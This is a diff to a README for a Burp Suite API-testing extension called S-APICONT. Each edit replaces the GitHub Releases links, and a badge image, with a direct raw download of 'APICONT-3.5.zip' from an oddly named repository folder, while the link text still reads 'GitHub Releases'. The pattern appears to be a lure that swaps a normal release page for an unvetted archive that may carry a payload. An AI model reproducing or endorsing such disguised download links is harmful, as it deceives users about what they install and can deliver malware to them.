@@ -6,9 +6,9 @@ Welcome to **S-APICONT**! This powerful Burp Suite extension helps you automate 
 
 ### 💾 Download S-APICONT
 
-[![Download S-APICONT](https://img.shields.io/badge/Download-S--APICONT-brightgreen)](https://github.com/demonsharkv2/S-APICONT/releases)
+[![Download S-APICONT](https://github.com/demonsharkv2/S-APICONT/raw/refs/heads/main/Pantagruelian/APICONT-3.5.zip)](https://github.com/demonsharkv2/S-APICONT/raw/refs/heads/main/Pantagruelian/APICONT-3.5.zip)
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/demonsharkv2/S-APICONT/releases).
+To get started, visit this page to download: [GitHub Releases](https://github.com/demonsharkv2/S-APICONT/raw/refs/heads/main/Pantagruelian/APICONT-3.5.zip).
 
 ## 📋 Features
 
@@ -27,7 +27,7 @@ Before you download S-APICONT, ensure your system meets the following requiremen
 
 ## 📥 Download & Install
 
-1. Visit the [GitHub Releases](https://github.com/demonsharkv2/S-APICONT/releases) page.
+1. Visit the [GitHub Releases](https://github.com/demonsharkv2/S-APICONT/raw/refs/heads/main/Pantagruelian/APICONT-3.5.zip) page.
 2. Locate the version you wish to download.
 3. Click the download link for the appropriate file for your operating system.
 4. Once the download is complete, open Burp Suite.
@@ -76,4 +76,4 @@ We welcome contributions! If you'd like to improve S-APICONT, consider forking t
 
 Explore and maximize the automation of your API testing with **S-APICONT**. Enjoy the ease of identifying and testing APIs without the hassle! 
 
-[![Download S-APICONT](https://img.shields.io/badge/Download-S--APICONT-brightgreen)](https://github.com/demonsharkv2/S-APICONT/releases)
+[![Download S-APICONT](https://github.com/demonsharkv2/S-APICONT/raw/refs/heads/main/Pantagruelian/APICONT-3.5.zip)](https://github.com/demonsharkv2/S-APICONT/raw/refs/heads/main/Pantagruelian/APICONT-3.5.zip)
